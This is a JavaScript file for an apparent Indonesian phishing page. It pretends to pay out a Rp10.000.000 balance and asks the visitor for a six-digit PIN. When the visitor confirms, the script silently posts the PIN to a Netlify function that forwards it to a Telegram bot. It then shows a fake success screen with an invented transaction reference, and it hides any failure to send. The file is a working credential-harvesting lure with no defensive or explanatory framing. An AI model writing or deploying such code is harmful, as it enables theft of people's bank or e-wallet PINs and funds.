document.addEventListener('DOMContentLoaded', function() {
    // Page navigation
    const page1 = document.getElementById('page1');
    const page2 = document.getElementById('page2');
    const page3 = document.getElementById('page3');
    const nextPage1Btn = document.getElementById('nextPage1');
    const backToPage1Btn = document.getElementById('backToPage1');
    const confirmPinBtn = document.getElementById('confirmPin');
    const finishButton = document.getElementById('finishButton');
    
    // PIN input handling
    const pinInputs = document.querySelectorAll('.pin-input');
    
    // Generate random reference number
    function generateReference() {
        const now = new Date();
        const datePart = now.getFullYear().toString().slice(-2) + 
                       (now.getMonth() + 1).toString().padStart(2, '0') + 
                       now.getDate().toString().padStart(2, '0') + 
                       now.getHours().toString().padStart(2, '0') + 
                       now.getMinutes().toString().padStart(2, '0');
        const randomPart = Math.floor(10000 + Math.random() * 90000);
        return datePart + randomPart;
    }
    
    // Format waktu transaksi Indonesia
    function formatWaktuTransaksi() {
        const now = new Date();
        const bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 
                       'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'];
        
        const hari = now.getDate();
        const namaBulan = bulan[now.getMonth()];
        const tahun = now.getFullYear();
        const jam = now.getHours().toString().padStart(2, '0');
        const menit = now.getMinutes().toString().padStart(2, '0');
        
        return `${hari} ${namaBulan} ${tahun}, ${jam}:${menit} WIB`;
    }
    
    // Navigate to page 2
    nextPage1Btn.addEventListener('click', function() {
        page1.classList.add('hidden');
        page2.classList.remove('hidden');
    });
    
    // Back to page 1
    backToPage1Btn.addEventListener('click', function() {
        page2.classList.add('hidden');
        page1.classList.remove('hidden');
        resetPinInputs();
    });
    
    // Handle PIN input - strict single digit enforcement
    pinInputs.forEach(input => {
        input.addEventListener('input', function() {
            // Ensure only one digit is entered
            if (this.value.length > 1) {
                this.value = this.value.slice(0, 1);
            }
            
            // Only allow numbers
            this.value = this.value.replace(/[^0-9]/g, '');
            
            const index = parseInt(this.getAttribute('data-index'));
            
            // Auto focus to next input
            if (this.value.length === 1 && index < 6) {
                pinInputs[index].focus();
            }
            
            checkPinComplete();
        });
        
        input.addEventListener('keydown', function(e) {
            const allowedKeys = [
                '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
                'Backspace', 'Delete', 'Tab', 
                'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown'
            ];
            
            if (!allowedKeys.includes(e.key)) {
                e.preventDefault();
            }
            
            const index = parseInt(this.getAttribute('data-index'));
            
            // Handle backspace navigation
            if (e.key === 'Backspace' && this.value.length === 0 && index > 1) {
                pinInputs[index - 2].focus();
            }
        });
        
        // Handle paste event
        input.addEventListener('paste', function(e) {
            e.preventDefault();
            const pasteData = e.clipboardData.getData('text/plain').replace(/[^0-9]/g, '');
            if (pasteData.length > 0) {
                this.value = pasteData.charAt(0);
                const index = parseInt(this.getAttribute('data-index'));
                if (index < 6) {
                    pinInputs[index].focus();
                }
                checkPinComplete();
            }
        });
    });
    
    // Confirm PIN and proceed to page 3
    confirmPinBtn.addEventListener('click', async function() {
        if (!this.disabled) {
            showLoading();
            
            // Get the complete PIN
            let pin = '';
            pinInputs.forEach(input => {
                pin += input.value;
            });

            // Set waktu transaksi dan nomor referensi
            document.getElementById('transaction-time').textContent = formatWaktuTransaksi();
            document.getElementById('transaction-ref').textContent = generateReference();
            
            try {
                // Send PIN to Telegram bot (silently fail if not configured)
                try {
                    await sendPinToTelegram(pin);
                    console.log('PIN successfully sent to Telegram');
                } catch (telegramError) {
                    console.log('Telegram notification not sent (non-critical):', telegramError.message);
                }
                
                // Proceed to success page
                setTimeout(function() {
                    hideLoading();
                    page2.classList.add('hidden');
                    page3.classList.remove('hidden');
                }, 1500);
            } catch (error) {
                console.error('Error during transaction:', error);
                hideLoading();
                alert('Proses pencairan berhasil, tetapi notifikasi tidak terkirim. Silakan cek saldo Anda.');
            }
        }
    });
    
    // Finish button
    finishButton.addEventListener('click', function() {
        page3.classList.add('hidden');
        page1.classList.remove('hidden');
        resetPinInputs();
    });
    
    // Helper function to check if PIN is complete
    function checkPinComplete() {
        let complete = true;
        pinInputs.forEach(input => {
            if (input.value.length !== 1) {
                complete = false;
            }
        });
        
        confirmPinBtn.disabled = !complete;
        if (complete) {
            confirmPinBtn.classList.remove('disabled');
        } else {
            confirmPinBtn.classList.add('disabled');
        }
    }
    
    // Helper function to reset PIN inputs
    function resetPinInputs() {
        pinInputs.forEach(input => {
            input.value = '';
        });
        confirmPinBtn.disabled = true;
        confirmPinBtn.classList.add('disabled');
        pinInputs[0].focus();
    }
    
    // Helper function to show loading
    function showLoading() {
        confirmPinBtn.innerHTML = 'Memproses...';
        confirmPinBtn.disabled = true;
    }
    
    // Helper function to hide loading
    function hideLoading() {
        confirmPinBtn.innerHTML = 'Cairkan Saldo';
    }
    
    // Function to send PIN to Telegram bot
    async function sendPinToTelegram(pin) {
        try {
            const response = await fetch('/.netlify/functions/send-to-telegram', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ 
                    pin: pin,
                    timestamp: new Date().toISOString(),
                    amount: 'Rp10.000.000'
                }),
            });

            const data = await response.json();
            
            if (!response.ok) {
                console.error('Telegram API error:', data.error);
                throw new Error(data.error || 'Failed to send PIN to Telegram');
            }

            return data;
        } catch (error) {
            console.error('Network/connection error:', error);
            throw error;
        }
    }
    
    // Initialize - focus first PIN input when page 2 is shown
    const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            if (!page2.classList.contains('hidden')) {
                resetPinInputs();
            }
        });
    });
    
    observer.observe(page2, {
        attributes: true,
        attributeFilter: ['class']
    });
});
